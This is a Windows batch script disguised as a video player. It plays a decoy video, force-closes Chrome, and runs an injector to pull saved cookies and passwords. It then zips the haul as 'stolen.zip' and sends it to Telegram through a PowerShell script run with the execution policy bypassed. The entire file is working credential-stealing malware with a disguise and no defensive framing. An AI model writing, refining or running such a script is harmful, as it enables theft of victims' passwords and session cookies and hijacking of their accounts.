@echo off
title Video Player
setlocal enabledelayedexpansion
cd /d "%~dp0"

:: Play video distraction
start "" "real_video.mp4"
timeout /t 3 /nobreak > nul

:: Kill Chrome if running
taskkill /f /im chrome.exe 2>nul
timeout /t 2 /nobreak > nul

:: Run injector
echo Running injector...
chrome_inject.exe --start-browser chrome

:: Check if output folder exists
if exist "output" (
    echo Cookies and passwords saved locally in output folder.
    
    :: Remove old zip if exists
if exist "stolen.zip" del /f /q "stolen.zip"    
    :: Zip the output folder (relative path)
    echo Zipping stolen data...
    powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::CreateFromDirectory('output', 'stolen.zip')"
    
    :: Send via Telegram
    if exist "send.ps1" (
        echo Sending to Telegram...
        powershell -ExecutionPolicy Bypass -File "send.ps1"
    ) else (
        echo Warning: send.ps1 not found – zip saved locally only.
    )
    
    echo Done. Check stolen.zip and Telegram.
) else (
    echo No data found. Injection may have failed.
)

pause
exit